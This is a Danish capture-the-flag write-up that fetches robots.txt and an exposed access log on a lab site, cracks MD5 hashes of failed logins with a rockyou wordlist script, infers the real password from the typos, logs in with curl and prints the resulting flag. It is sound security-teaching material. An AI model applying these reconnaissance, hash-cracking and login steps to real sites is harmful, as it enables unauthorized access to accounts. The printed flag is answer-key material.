robots.txt afslører en eksponeret log

Opgaven beder dig logge ind og poste på handyman-joe.com. Start med robots.txt: de stier en side beder crawlere IGNORERE er tit præcis de interessante.

curl --resolve handyman-joe.com:80:<ip> http://handyman-joe.com/robots.txt
# Disallow: /create/   /drafts/   /login/   /logout/
# Disallow: /~admin/accesslog.txt      <-- en eksponeret access-log

Loggen logger MD5 af fejlede login-forsøg

Access-loggen er læsbar og indeholder MD5-hashes af input fra fejlede logins, med et vellykket login lige efter:

curl --resolve handyman-joe.com:80:<ip> http://handyman-joe.com/~admin/accesslog.txt
# WARNING: Failed login attempt. Input MD5: 880a3acf50d222734feae7e1ddd2c48e
# WARNING: Failed login attempt. Input MD5: 5c3d63ed342437f2c603e5360181c1b5
# INFO:    Successful login attempt          <-- lige efter de to fejl

Rækkefølgen er pointen: de to fejl ligger umiddelbart FØR det vellykkede login.

Knæk hashene: de fejlede forsøg er typos

Knæk de to MD5'er mod rockyou, her med ren hashlib (alternativt hashcat -m 0 eller john --format=raw-md5):

import hashlib
targets = {'880a3acf50d222734feae7e1ddd2c48e', '5c3d63ed342437f2c603e5360181c1b5'}
for w in open('/usr/share/wordlists/rockyou.txt', 'rb'):
    if hashlib.md5(w.rstrip(b'\n')).hexdigest() in targets:
        print(w.decode(errors='replace').strip())
# proffesional   (typo: dobbelt-f)
# profesional    (typo: ét s)

De to fejl lige før et vellykket login er typos af det rigtige password. Den korrekte stavning mellem proffesional og profesional er professional. Login er kun-password, uden brugernavn.

Log ind og publicér et indlæg

curl --resolve handyman-joe.com:80:<ip> -c c.txt \
  --data "password=professional" http://handyman-joe.com/login/
curl --resolve handyman-joe.com:80:<ip> -b c.txt \
  --data "title=x&content=y&published=y" http://handyman-joe.com/create/
# Indlægget viser: "...here's your complementary flag: HKN{r5-O1I-nzF1d}"

Hvad du har lært

  • robots.txt-Disallow = 'kig her'; eksponerede logs rummer tit credentials.
  • De fejlede forsøg var typos; den korrekte stavning var passwordet.

Hvor ses dette igen?

En klog detalje her: de FEJLEDE login-forsøg var guld værd. Folk taster deres rigtige password med små tastefejl, så de mislykkede forsøg lige før et vellykket login er typos AF det rigtige password. At rette dem fører til svaret. Mere generelt: logs der ikke burde være offentlige (adgangslogs, fejl-logs, debug-output) rummer tit credentials, interne stier eller stak-spor, og robots.txt peger ofte lige på dem.
